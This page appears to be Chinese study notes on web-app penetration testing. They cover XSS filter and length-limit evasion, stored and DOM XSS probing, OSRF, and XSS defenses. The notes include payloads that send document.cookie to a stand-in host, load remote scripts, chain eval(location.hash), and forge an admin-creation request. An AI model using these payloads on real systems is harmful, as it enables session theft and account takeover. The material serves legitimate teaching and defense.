<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 将 cookie 传送至主机名为 a 的服务器</span><br><span class="line">open(&quot;//a/&quot;+document.cookie)</span><br><span class="line"></span><br><span class="line">// 从主机名为 a 的服务器加载一段脚本</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://a</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">注：以上的服务器只能针对局域网内的机器，如果是因特网上的机器，只提供主机名还不够</span><br></pre></td></tr></table></figure>

<blockquote>
<p>有一些第三方工具可以用来尽量缩短有效的 js 代码，例如 javascript packer 工具</p>
</blockquote>
<p>方法二：将一段攻击脚本拆分成多段，分散在同一个页面的不同位置</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 源代码，接收请求 URL：https://sample.com/account.php?page_id=244&amp;seed=123&amp;mode=normal</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;page_id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;244&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;seed&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;mode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;normal&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 攻击者可以将请求参数设计为如下格式：https://sample.com/account.php?page_id=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*&amp;seed=*/</span><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);<span class="comment">/*&amp;mode=*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">得到的结果如下：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;page_id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">/*&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;seed&quot;</span> <span class="attr">value</span>=<span class="string">&quot;*/alert(document.cookie);/*&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;mode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;*/</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br><span class="line">以上结果将执行 &quot;alert(document.cookie);&quot;，同时该脚本前后位置的部分变成了 HTML 注释；</span><br></pre></td></tr></table></figure>

<blockquote>
<p>当使用了长度限制的过滤后，例如将名称限制在 12 个字符以内，开发者有可能觉得如此短的长度，不可能实施有效的 XSS 攻击，因此没有进一步对该输入进行净化过滤，从而攻击者有机会将攻击荷载分散到不同的多个位置，然后其组合起来后，将有效的注释掉两个位置中间的部分；</p>
<p>有可能攻击者在某个中间位置，因为没有长度限制，实施了很严格的净化过滤，但由于前后位置已经被攻陷，导致中间位置的净化完全失去作用；</p>
</blockquote>
<p>方法三：将反射型漏洞转化成 DOM 型漏洞</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 假设某个反射型漏洞存在长度限制，攻击者可以在合理的长度范围内，注入一段脚本，让其访问另外一个标签节点的值，并执行它</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 该段脚本只有45个字符，但它可以在页面中生成一个 DOM 漏洞，然后攻击者再利用生成的 DOM 漏洞来创造机会，执行位于片断字符串中的另一段脚本；</span><br><span class="line"></span><br><span class="line">完整的请求为：http://sample.com/error/5/error.ashx?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(location.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>#alert(&#x27;long script insert here...&#x27;)</span><br><span class="line"></span><br><span class="line">或者为：http://sample.com/error.ashx?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(location))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>#%0Aalert(&#x27;long script insert here...&#x27;)</span><br><span class="line">location 代表的值先被 HTML 解码，然后传递给 eval 命令，整个 URL 作为有效的 javascript 执行；其中 http: 协议前缀作为代码标签，协议前缀后的 // 变成了单行注释的起始点，%0A 经过解码后，变成了换行符，表示注释结束，之后 alert 的代码被执行</span><br></pre></td></tr></table></figure>

<h5 id="实施有效的-XSS-攻击"><a href="#实施有效的-XSS-攻击" class="headerlink" title="实施有效的 XSS 攻击"></a>实施有效的 XSS 攻击</h5><h6 id="将攻击扩展到其他页面"><a href="#将攻击扩展到其他页面" class="headerlink" title="将攻击扩展到其他页面"></a>将攻击扩展到其他页面</h6><p>假如在某个页面发现了一个 XSS 漏洞，但该页面可能并不包含敏感数据，此时需要扩展该漏洞攻击范围。常见方法为利用该漏洞，先传送一个攻击脚本，该脚本用来实现在用户的浏览器中持续运行，监控并提取用户的数据；之后，当用户进入到包含敏感数据的页面时，就可以提取需要的数据了；</p>
<p>例如可以通过创建一个包含整个浏览器窗口的 iframe，然后在该 iframe 中重新加载当前页面；之后用户的浏览操作，实际都是在当前 iframe 中运行，并没有切换页面，从而使得攻击脚本延长了生命周期，得到始终运行；</p>
<h6 id="修改请求方法"><a href="#修改请求方法" class="headerlink" title="修改请求方法"></a>修改请求方法</h6><p>很多应用程序经常同时接受 GET 和 POST 请求，但开发者并没有意识到这点，只将过滤规则适用在其中一个请求上，另外一种请求并没有使用过滤，因此，攻击者有机会利用另外一种请求要实现攻击；</p>
<h6 id="通过-cookie-利用-XSS-漏洞"><a href="#通过-cookie-利用-XSS-漏洞" class="headerlink" title="通过 cookie 利用 XSS 漏洞"></a>通过 cookie 利用 XSS 漏洞</h6><ul>
<li>有些开发者利用 cookie 来保存用户相关的数据，从而实现定制化的效果，但这样其实很危险，因为这意味着攻击者可以提交设计好的字符串，然后让其出现在 cookie 中；之后应用程序的某个功能会去读取该 cookie 值，从而触发恶意脚本的执行；</li>
<li>另外有些应用程序可能还会允许在 URL 中设置与 cookie 同名的参数，然后会读取该参数值，导致漏洞；</li>
<li>一些浏览器使用的扩展技术（如 Flash）可能存在各种漏洞，但没有及时修复，通过利用这些插件本身的漏洞，就可能实现攻击；</li>
<li>在有漏洞的 A 页面设置一个永久性的 cookie 值，然后在 B 页面，当 cookie 被读取时，脚本得以执行；</li>
</ul>
<blockquote>
<p>cookie 攻击可行的本质原因在于 cookie 是跨页面存在的，因此它可以用来在不同页面之间传递数据；</p>
</blockquote>
<h6 id="通过-Referer-消息头利用-XSS-漏洞"><a href="#通过-Referer-消息头利用-XSS-漏洞" class="headerlink" title="通过 Referer 消息头利用 XSS 漏洞"></a>通过 Referer 消息头利用 XSS 漏洞</h6><p>攻击者自建一台服务器，放上目标应用程序的 URL，诱使用户点击；当用户点击后，发给目标程序请求消息头中的 Referer 字段，将自动设置为攻击者的服务器，此时攻击者有机会在该 Referer 字段中放入脚本，当目标程序读取它时，触发执行；</p>
<blockquote>
<p>很多应用程序会尝试读取请求的 Referer 字段来实现一些功能，例如显示访问来源；</p>
</blockquote>
<h6 id="通过非标准请求和响应内容利用-XSS-漏洞"><a href="#通过非标准请求和响应内容利用-XSS-漏洞" class="headerlink" title="通过非标准请求和响应内容利用 XSS 漏洞"></a>通过非标准请求和响应内容利用 XSS 漏洞</h6><p>有些应用程序在脚本中使用 XMLHttpRequest 来发送请求，而无须刷新页面；之后在收到服务端的响应内容后，通过 AJAX 提取内容，并改写  DOM 来实现页面局部内容的变化；</p>
<blockquote>
<p>跨域请求：用户在 A 域名的页面下，发起访问 B 域名的请求；表单是允许的，但是 XHR 是不允许的，除非服务端实现接口；原理很简单：当浏览器发现用户发起向 B 网站的请求时，就向 A 域名的服务器发送一个确认，如果 A 服务器返回的响应中，在报头的 Access-Control-Allow-Origin 字段指示 B 域名是其允许的访问范围，那么浏览器就会向 B 域名发出请求；如果不允许，则浏览器拒绝请求，抛出一个错误；</p>
</blockquote>
<p>通过在 HTTP 报头的 Content-Type 字段指定消息类型，浏览器支持直接处理响应内容，而无须由脚本进行处理；这种情况下，通常注入脚本代码的方式将失效，因为脚本没有机会操作响应内容；</p>
<p>虽然 XHR 不允许跨域请求，但传统的表单则支持向任意的域名发起请求，因此，可以使用表单来发送数据，从而避开 XHR 的限制；</p>
<p>将表单的 enctype 属性值设置为 text&#x2F;plain，可以实现在 HTTP 请求主体中跨域传送数据；其原理在于，当浏览器发现某个表单的 enctype 属性值为  text&#x2F;plain 时，它将按如下的方式处理该表单的数据：</p>
<ul>
<li>在请求中隔行传送每个表单参数；</li>
<li>使用等号分隔每个参数的键名和键值；</li>
<li>不对参数名称和值进行 URL 编码；</li>
</ul>
<blockquote>
<p>注：不是所有的浏览器都遵守上面的做法，需要提前确认；已知浏览器：IE、Firefox、Opera 等；</p>
</blockquote>
<p>这里最大的一个特性在于，浏览器会为键值地自动添加等号，因此攻击者可以利用这个特性来构建数据；假设需要提交的数据格式，本身包含有至少一个等号，那么我们可以将等号左边的数据做为键名，等号右边的数据做为键值，等号则由浏览器自动添加，三者合一，最终形成 XML 数据格式；</p>
<blockquote>
<p>此处的要点在于利用表单的特性，来构建 XML 格式的请求主体；</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 传送跨域的 XML 请求</span><br><span class="line">// 将表单的 enctype 属性值设置为 text/plain，可以实现在 HTTP 请求主体中跨域传送数据</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://sample.com/vuln.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;&lt;?XML version&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;&quot;1.0&quot;?&gt;&lt;data&lt;param&gt;foo&lt;/param&gt;&lt;/data&gt;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果在包含非标准内容的请求中发现了类似 XSS 漏洞的行为，则可以通过将消息头 Content-Type 属性的值设置为 text&#x2F;plain，然后查看应用程序是否依然能够正常响应；如果可以，说明存在 XSS 攻击漏洞；如果不行，则漏洞无法利用；</p>
</blockquote>
<p>当响应由浏览器直接执行时，浏览器一般会跟消息头中的 Content-Type 规范，对响应内容进行处理；此时如果想要构建能够触发浏览器执的脚本的响应，一般来说需要利用内容类型的一些特点，例如 XML 支持在中间插入 HTML 内容（使用 XML 标签定义一个 XHTML 的命名空间）；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210309084620.png"></p>
<h6 id="攻击浏览器-XSS-过滤器"><a href="#攻击浏览器-XSS-过滤器" class="headerlink" title="攻击浏览器 XSS 过滤器"></a>攻击浏览器 XSS 过滤器</h6><p>很多浏览器都内置了防范 XSS 攻击的功能，它们会监控请求和响应，检查其中的内容是否携带 XSS 攻击内容，如果有的话，会对其进行修改，以阻止攻击；</p>
<p>虽然浏览器的内置功能确实可以阻止绝大多数的标准 XSS 攻击，为攻击者带来很大的障碍，但有意思的是，过滤规则本身也会引入新的漏洞，给攻击者新的机会；一些常见的避开办法如下：</p>
<ul>
<li>过滤器经常只检查参数值，只没有检查参数名称；这意味着如果参数名称会回显的话，那么攻击者就可以将脚本注入到参数名称中，避开过滤；</li>
<li>过滤器单独检查每个参数值，但是攻击者可以将攻击脚本分散在多个参数中；当这些参数同时回显时，就能够组合成完整的攻击脚本；</li>
<li>出于性能考虑，过滤器仅检查跨域请求，没有检查由用户点击 URL 发出的本地请求，攻击者可以在内容中放入恶意链接，等待用户点击；</li>
</ul>
<p>利用浏览器本身的非正常行为：</p>
<ul>
<li>当存在多个同名参数时，IE 会将它们串联起来，因此攻击者可以将攻击荷载分散在多个参数中，从而避开 IE 针对单个参数的过滤；但最终串联起来后又能实现预期效果；</li>
<li>过滤器通常基于对输入和输出进行匹配检查，确定二者存在关联；因此攻击者可以故意在输入中放入应用程序的现有脚本，从而利用过滤器将现有脚本进行净化，让其失去作用，例如破坏应用程序在客户端的案例防御功能；</li>
</ul>
<h3 id="查找并利用保存型-XSS-漏洞"><a href="#查找并利用保存型-XSS-漏洞" class="headerlink" title="查找并利用保存型 XSS 漏洞"></a>查找并利用保存型 XSS 漏洞</h3><p>保存型漏洞的探查大体上和反射型类似，但二者还是有如下一些重要的区别</p>
<p>渗透测试步骤</p>
<ul>
<li>反射型漏洞能够直接从应用程序的响应内容中发现，保存型则要曲折一点；当在某个位置提交一个预设输入值的请求后，需要在整个程序的范围去查找该输入会出现在什么地方，因为它不一定直接出现在该请求的响应内容中；同一个输入值有可能出现在很多个不同的页面，并且每个页面可能使用了不同的过滤保护方法，因此需要对每个出现的位置进行单独的分析；</li>
<li>重点检查管理员可以访问的所有应用程序区域，并确认其中是否存在某些内容可以由非管理员用户提交；例如很多应用程序会提供日志浏览功能，这种功能很容易存在漏洞，攻击者可以通过提交包含恶意 HTML 的日志记录，等待管理员浏览时触发；</li>
<li>某些应用程序的功能是由多个步骤组成的，因此单个步骤中提交的数据要最终成功保存并生效，需要彻底完全所有步骤，再判断漏洞是否存在，仅单个步骤不准确；</li>
<li>跟探查反射型漏洞时一样，在提交输入时，除了尝试每一个参数外，还应该包括每一个消息头；同时，在探查保存型漏洞时，还应注意应用程序是否接收一些带外通道数据的功能，这些功能很很可能也是攻击切入点；</li>
<li>如果应用程序允许上传和下载文件，则应探查该功能是否存在保存型漏洞；</li>
<li>发挥想象力，找到各种可能提交输入，并出现在其他用户界面的办法；例如某些应用程序的搜索功能会显示搜索频率最高的关键字，攻击者通过多次提交相同的搜索关键字，即可以引入攻击荷载；</li>
</ul>
<p>在探查完位置后，接下来要考虑两个事情：</p>
<ul>
<li>如果设计荷载，让其出现在目标用户的界面上，实现预期目的；</li>
<li>如果避开过滤</li>
</ul>
<blockquote>
<p>在提交输入请求时，如果存在多个参数，则应该为每个参数设计不同的值，这样才好判断具体是哪个参数，最终出现在哪个位置；如果所有参数值都相同，则很难判断，全部混在一起了；</p>
</blockquote>
<h4 id="在-Web-邮件应用程序中测试-XSS"><a href="#在-Web-邮件应用程序中测试-XSS" class="headerlink" title="在 Web 邮件应用程序中测试 XSS"></a>在 Web 邮件应用程序中测试 XSS</h4><p>Web 邮件应用程序由于需要接收第三方的内容，并展示在界面上以供用户查看，因此其天然存在保存型 XSS 漏洞的风险；最便捷的探查办法是创建一个自己的账户，然后自己给自己发送大量设计过攻击邮件，看攻击是否能够成功；</p>
<blockquote>
<p>如果使用标准的邮件客户端，由于其自带内容净化功能，很可能导致无法将原始内容一字不变的发送出去，此时需要使用一些特殊的邮件发送工具来发送，例如 UNIX sendmail 命令；</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 命令</span><br><span class="line">sendmail -t <span class="built_in">test</span>@example.org &lt; email.txt</span><br></pre></td></tr></table></figure>

<p>在 email.txt 文件中指定邮件内容</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210311073209.png"></p>
<blockquote>
<p>可根据需要使用不同的 content-type 和 charset，以避开目标服务器的过滤机制；</p>
</blockquote>
<h4 id="在上传文件中测试-XSS"><a href="#在上传文件中测试-XSS" class="headerlink" title="在上传文件中测试 XSS"></a>在上传文件中测试 XSS</h4><p>文件上传功能很常见，尤其是图片，常用于 UGC 内容和用户的头像中；该功能是否易于受到攻击，跟几个方面的因素有关：</p>
<ul>
<li>上传时，是否有扩展名的限制；</li>
<li>上传时，是否有检查文件内容，以确认格式正确；</li>
<li>下载时，是否通过 content-type  消息头指定内容类型，例如 image&#x2F;jpeg；</li>
<li>下载时，是否通过 Disposition 消息头，指示浏览器直接保存文件到磁盘上，而非打开它；</li>
</ul>
<p>测试方法：上传一个包含简单的概念验证脚本的文件，然后下载它，看是否会原样返回并执行脚本；如果会的话，则说明漏洞存在；</p>
<p>如果有扩展名限制，则尝试更换其他各种不同的扩展名，因此虽然扩展名与内容可能不同，但如果内容中包含 HTML，它仍然有可能被浏览器执行；</p>
<p>如果应用程序对文件内容进行检查，则可通过混合文件格式来避开，即在一个文件中包含部分指定类型的内容（如图片）；由于浏览器支持越来越多的可执行代码格式，因此混合文件内容的攻击原理仍然适用；</p>
<h4 id="在通过-Ajax-上传的文件中测试-XSS"><a href="#在通过-Ajax-上传的文件中测试-XSS" class="headerlink" title="在通过 Ajax 上传的文件中测试 XSS"></a>在通过 Ajax 上传的文件中测试 XSS</h4><blockquote>
<p>URL 的片断标识符 # 用来对当前 URI 资源的某个局部进行标识，它常用的一个场景是可以记住某个位置，这样当用户在进入这个界面时，通过脚本，可以让页面滚动到指定的局部位置，而无须从头开始浏览；</p>
</blockquote>
<p>由于片断标识符中的内容会被脚本加载，因为它可能存在 XSS 漏洞；攻击者通过在标识符内容中混入某个恶意文件，诱使用户点击，触发恶意文件的加载并执行；例如：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210311081839.png"></p>
<p>攻击者甚至可以在标识符内容中放入一个外部服务器的脚本，当用户点击链接时，会向某个攻击者控制的外部服务器发送请求，下载攻击者提前写好的恶意脚本文件；</p>
<h3 id="查找并利用基于-DOM-的-XSS-漏洞"><a href="#查找并利用基于-DOM-的-XSS-漏洞" class="headerlink" title="查找并利用基于 DOM 的 XSS 漏洞"></a>查找并利用基于 DOM 的 XSS 漏洞</h3><blockquote>
<p>DOM 类型的漏洞与反射型漏洞的区别在于前者没有提供 HTML，而是通过将恶意代码混入请求参数来实现攻击；</p>
</blockquote>
<p>常规探查办法：手动浏览应用程序的每个功能，并修改每一个参数，插入一个特殊的测试字符串，然后观察应用程序服务器返回的响应中，是否包含该字符串；</p>
<p>由于不知道应用程序的客户端脚本将如何处理参数和插入方式，使用常规的探查办法可能非常低效，更好的办法是主动阅读目标程序的客户端 JS 代码，了解其处理参数的逻辑，然后有针对性的对输入参数进行设计；已有不少现成的工具可以完成这一个过程，例如 DOMTracer；</p>
<p>渗透测试步骤：</p>
<ul>
<li>在解析应用程序的过程中，检查客户端脚本是否调用 DOM API，如果有的话，再查看页面上是否参数被提交到页面中；常见的 API 如下：<ul>
<li>document.location</li>
<li>document.URL</li>
<li>document.URLUnencoded</li>
<li>document.referer</li>
<li>windown.location</li>
</ul>
</li>
<li>检查 DOM API 的调用代码，了解其处理用户数据的方法，看是否可以使用针对性的输入来执行任意的 js ；</li>
<li>特别注意数据被传送到 document 的以下方法：<ul>
<li>document.write()</li>
<li>document.writeln()</li>
<li>document.body.innerHtml()</li>
<li>eval()</li>
<li>window.execScript()</li>
<li>window.setInterval()</li>
<li>window.setTimeout()</li>
</ul>
</li>
<li>查看客户端的脚本中是否有过滤的代码，如果有的话，了解其过滤机制，以设计避开的办法；</li>
<li>有时候，服务端本身也对输入进行过滤，以避免 DOM 攻击；此时，需要使用前面提到的各种方法，探查服务器的机制；</li>
<li>有些客户端脚本不是将参数解析成键值对，而是直接提取等号位置后面的内容，此时会有两个漏洞：<ul>
<li>服务端很可能只会过滤已知属性，而不会过滤未知属性；因此，攻击者可以插入一个虚拟的参数键值对，避开服务端的过滤；同时利用客户端只提取等号右边内容的特点，让插入值被加载；</li>
<li>由于浏览器不会将片断符的内容提交给服务端，因此攻击可以将恶意内容插入在片断标识符之后；这样可避开服务端的检查，同时内容仍可被客户端加载；</li>
</ul>
</li>
<li>如果客户端脚本对基于 DOM 的数据进行非常复杂的处理，通过静态代码分析很难了解其完整处理过程的话，可以尝试利用 js 调试器来动态监控脚本的执行情况，因为调试器可以很方便的设置断点，监视感兴趣的代码与数据；</li>
</ul>
<h2 id="防止-XSS-攻击"><a href="#防止-XSS-攻击" class="headerlink" title="防止 XSS 攻击"></a>防止 XSS 攻击</h2><h3 id="防止反射型与保存型-XSS-漏洞"><a href="#防止反射型与保存型-XSS-漏洞" class="headerlink" title="防止反射型与保存型 XSS 漏洞"></a>防止反射型与保存型 XSS 漏洞</h3><p>反射型与保存型 XSS 漏洞的根本原因在于未对用户的输入进行严格的过滤和净化；</p>
<p>三重防御法</p>
<h4 id="确认输入"><a href="#确认输入" class="headerlink" title="确认输入"></a>确认输入</h4><ul>
<li>数据长度限制</li>
<li>仅包含合法字符的白名单；</li>
<li>与一个特殊的正则表达式匹配；</li>
<li>对不同的字段应用不同的确认规则</li>
</ul>
<h4 id="确认输出"><a href="#确认输出" class="headerlink" title="确认输出"></a>确认输出</h4><p>如果用户提交的输入需要被复制到响应中的话，那些应该对这些内容进行严格的净化</p>
<ul>
<li>对数据进行 HTML 编码，无谓数据出现在什么地方，无论什么字符；</li>
<li>避免在敏感位置插入用户可以控制的数据；如果一定需要，则应根据用户的输入的类型，插入由开发者提前设计好的内容，而不是复制并插入用户提交的内容；</li>
<li>对用户输入中出现的敏感字符进行转义；</li>
</ul>
<p>输入和输出过滤结合可以带来双重保障，降低被攻击的风险，其中输出过滤必不可少；虽然这会带来一定的性能损失；</p>
<h4 id="消除危险的插入点"><a href="#消除危险的插入点" class="headerlink" title="消除危险的插入点"></a>消除危险的插入点</h4><ul>
<li>避免在现有的 JS 代码中插入用户可控制的数据，包括 <script> 标签和事件处理器</li>
<li>避免在接受 URL 作为标签属性值嵌入用户输入；</li>
<li>在消息头中强制使用指定的编码类型，避免由请求参数或者用户输入进行指定；</li>
</ul>
<h4 id="允许有限的-HTML"><a href="#允许有限的-HTML" class="headerlink" title="允许有限的 HTML"></a>允许有限的 HTML</h4><p>尽量避免接受由用户直接提交包含 HTML 的内容，如果实在必须支持，则应该严格控制用户可用的 HTML 标签子集，避免提供任何引入脚本的方法，例如使用白名单，仅允许特定的标签和属性；即使这样也仍然有风险，因为攻击者可以普通的常用属性中插入脚本；一般来说，较好的办法是找到某个成熟的框架，例如 AntiSamy ，用来过滤用户提交的输入；</p>
<p>另外一种办法是开发某种定制的中间语言，允许用户在输入中使用有限的中间语言，然后再由应用程序进行翻译；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210312195839.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210312195854.png"></p>
<h3 id="防止基于-DOM-的-XSS-漏洞"><a href="#防止基于-DOM-的-XSS-漏洞" class="headerlink" title="防止基于 DOM 的 XSS 漏洞"></a>防止基于 DOM 的 XSS 漏洞</h3><h4 id="确认输入-1"><a href="#确认输入-1" class="headerlink" title="确认输入"></a>确认输入</h4><p>在客户端的脚本中，对用户输入进行过滤；同时在服务端对 URL 数据进行严格的确认，以检测出包含攻击脚本和恶意请求，过滤的方法包括：</p>
<ul>
<li>查询字符串中只有一个参数；</li>
<li>参数名为 message，大小写敏感；</li>
<li>参数值仅包含字母或数字内容；</li>
</ul>
<h4 id="确认输出-1"><a href="#确认输出-1" class="headerlink" title="确认输出"></a>确认输出</h4><p>将用户可控制的 DOM 数据插入到文档中之前，应用程序应对其进行 HTML 编码，以便将一些危险的字符安全的显示在页面中，示例如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sanitize</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> d = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">    d.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(str));</span><br><span class="line">    <span class="keyword">return</span> d.<span class="property">innerHTML</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="13-攻击其他用户：其他技巧"><a href="#13-攻击其他用户：其他技巧" class="headerlink" title="13. 攻击其他用户：其他技巧"></a>13. 攻击其他用户：其他技巧</h1><h2 id="诱使用户执行操作"><a href="#诱使用户执行操作" class="headerlink" title="诱使用户执行操作"></a>诱使用户执行操作</h2><h3 id="请求伪造"><a href="#请求伪造" class="headerlink" title="请求伪造"></a>请求伪造</h3><p> 攻击者在无需知道受害者的 cookie 是什么，而是直接由浏览器添加该 cookie，在受害者客户端发起伪造的请求；</p>
<h4 id="本站点请求伪造"><a href="#本站点请求伪造" class="headerlink" title="本站点请求伪造"></a>本站点请求伪造</h4><blockquote>
<p>OSRF：on site request forgery</p>
</blockquote>
<p>利用输入可以出现在页面中的特点（即保存型 XSS 漏洞），在页面中插入一个伪造的请求，当用户（尤其是管理员用户）点击该设计好的 URL 链接时，发起一个请求（例如创建一名管理员用户），达到攻击目的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--请求参数--&gt;</span></span><br><span class="line">type=question&amp;name=daf&amp;message=foo</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--页面结构--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/images/question.gif&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>daf<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--开发者可能对 name 和 message 参数进行了过滤，但攻击可以针对 img 标签的 src 标签属性设计插入</span></span><br><span class="line"><span class="comment">&quot;/admin/newUser.php?username=daf2&amp;password=0wned&amp;role=admin#&quot;，最后的 # 符号将终止原本的 .gif 后缀--&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>案例1：eBay 网站</p>
<ul>
<li>攻击者创建一个拍卖品，吸引用户去点击查看它；攻击者在创建卖品时，会上传一个指向站外服务器的卖品图片链接；创建时，该链接是有效的，指向的内容确实是一张图片，从而可以通过 eBay 的检查机制；</li>
<li>卖品创建完成后，攻击品替换了链接中的内容，变成了一段脚本；</li>
<li>当受害者点击该链接时，会将恶意脚本下载到本地并执行；</li>
<li>该恶意脚本会代表受害者发起一个链接，对 eBay 上面另外一个卖品发起任意的报价；</li>
</ul>
<p>渗透测试步骤</p>
<ul>
<li>如果一个用户输入的数据，会显示在另外一名用户的界面上，则它除了可能存在保存型 XSS 漏洞外，还有可能存在 OSRF 型漏洞；</li>
<li>用户提交的数据被插入到某个 URL 或者路径中的时候，很有可能存在 OSRF 漏洞（除非应用程序设置字符白名单进行过滤）</li>
<li>如果发现 OSRF 漏洞， 则应该有针对性的设计 URL 请求作为攻击目标；</li>
</ul>
